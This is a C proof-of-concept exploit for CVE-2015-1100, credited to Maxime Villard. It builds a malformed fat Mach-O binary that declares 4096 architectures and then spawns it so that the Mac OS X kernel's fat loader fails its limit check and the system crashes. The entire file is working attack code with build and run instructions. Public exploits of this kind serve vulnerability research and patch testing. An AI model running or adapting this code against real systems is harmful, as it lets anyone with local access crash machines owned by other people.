/*
* 2015, Maxime Villard, CVE-2015-1100
* Local DoS caused by a missing limit check in the fat loader of the Mac OS X
* Kernel.
*
*  $ gcc -o Mac-OS-X_Fat-DoS Mac-OS-X_Fat-DoS.c
*  $ ./Mac-OS-X_Fat-DoS BINARY-NAME
*
* Obtained from: http://m00nbsd.net/garbage/Mac-OS-X_Fat-DoS.c
* Analysis:      http://m00nbsd.net/garbage/Mac-OS-X_Fat-DoS.txt
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <spawn.h>
#include <unistd.h>
#include <err.h>
#include <mach-o/fat.h>
#include <sys/stat.h>

#define MAXNUM (4096)
#define MAXNUM0 (OSSwapBigToHostInt32(MAXNUM))

void CraftBinary(char *name)
{
  struct fat_header fat_header;
  struct fat_arch *arches;
  size_t i;
  int fd;

  memset(&fat_header, 0, sizeof(fat_header));
  fat_header.magic = FAT_MAGIC;
  fat_header.nfat_arch = 4096;

  if ((arches = calloc(MAXNUM0, sizeof(struct fat_arch))) == NULL)
    err(-1, "calloc");
  for (i = 0; i < MAXNUM0; i++)
    arches[i].cputype = CPU_TYPE_I386;

  if ((fd = open(name, O_CREAT|O_RDWR)) == -1)
    err(-1, "open");
  if (write(fd, &fat_header, sizeof(fat_header)) == -1)
    err(-1, "write");
  if (write(fd, arches, sizeof(struct fat_arch) * MAXNUM0) == -1)
    err(-1, "write");
  if (fchmod(fd, S_IXUSR) == -1)
    err(-1, "fchmod");
  close(fd);
  free(arches);
}

void SpawnBinary(char *name)
{
  cpu_type_t cpus[] = { CPU_TYPE_HPPA, 0 };
  char *argv[] = { "Crazy Horse", NULL };
  char *envp[] = { NULL };
  posix_spawnattr_t attr;  
  size_t set = 0;
  int ret;

  if (posix_spawnattr_init(&attr) == -1)
    err(-1, "posix_spawnattr_init");
  if (posix_spawnattr_setbinpref_np(&attr, 2, cpus, &set) == -1)
    err(-1, "posix_spawnattr_setbinpref_np");
  fprintf(stderr, "----------- Goodbye! -----------\n");
  ret = posix_spawn(NULL, name, NULL, &attr, argv, envp);
  fprintf(stderr, "Hum, still alive. You are lucky today! ret = %d\n", ret);
}

int main(int argc, char *argv[])
{
  if (argc != 2) {
    printf("Usage: %s BINARY-NAME\n", argv[0]);
  } else {
    CraftBinary(argv[1]);
    SpawnBinary(argv[1]);
  }
}


